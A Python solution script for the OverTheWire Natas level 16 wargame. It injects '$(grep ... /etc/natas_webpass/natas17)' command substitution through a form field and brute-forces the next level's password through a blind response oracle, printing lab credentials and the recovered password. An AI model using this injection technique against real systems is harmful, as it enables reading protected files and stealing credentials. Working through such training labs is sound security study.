import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
natas16_Username = "natas16"
natas16_Password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
auth = (natas16_Username, natas16_Password)

lowercase_Pass = "8ps3h0gwbn5rd9s7gmadgqndkhpkq9"
natas17_Password = ""
total_Charlist = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789"
lower_Charlist = string.ascii_lowercase + "0123456789"

# print(requests.get(url, auth=auth).text)
# <input name=needle><input>

print("\nStep 1 => Finding Password Charecters... \n")

passFile = open("./Natas 17 Password.txt", 'a')
passFile.write(f"\nNatas 17 Password (Case Unsensitive): {lowercase_Pass}")

while len(lowercase_Pass) != 32:
    for char in lower_Charlist:
        cmd = f"$(grep -i ^{lowercase_Pass + char} /etc/natas_webpass/natas17)"
        data = {'needle': cmd}

        print(f"Cheking Char {char} ")
        responce = requests.post(url, data, auth=auth)
        # print(responce.text)
        print(f"Char {char} Is Checked.")

        if "African" in responce.text:
            continue
        else:
            lowercase_Pass += char
            passFile.write(char)
            print(f"\nPassword: {lowercase_Pass}\n" +
                  f"Password Length: {len(lowercase_Pass)}\n")
            break

passFile.write("\nNatas 17 Password (Case Sensitive): ")

print("\nStep 2 => Checking Password In Case Sensitive... \n")

uppercase_Pass = lowercase_Pass.upper()

for i in range(32):
    cmd = f"$(grep ^{natas17_Password + lowercase_Pass[i]} /etc/natas_webpass/natas17)"
    data = {'needle': cmd}

    responce = requests.post(url, data, auth=auth)
    # print(responce.text)

    if "African" in responce.text:
        natas17_Password += uppercase_Pass[i]
    else:
        natas17_Password += lowercase_Pass[i]

    print(f"\nPassword: {natas17_Password}\nLength: {len(natas17_Password)}\n")


print(
    f"\nBruteforce Was Successful. We Find And Saved Password.\nNatas 17 Password Is: {natas17_Password}\n")
passFile.write(f"{natas17_Password}\n")
passFile.close()

# 8ps3h0gwbn5rd9s7gmadgqndkhpkq9cw
# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
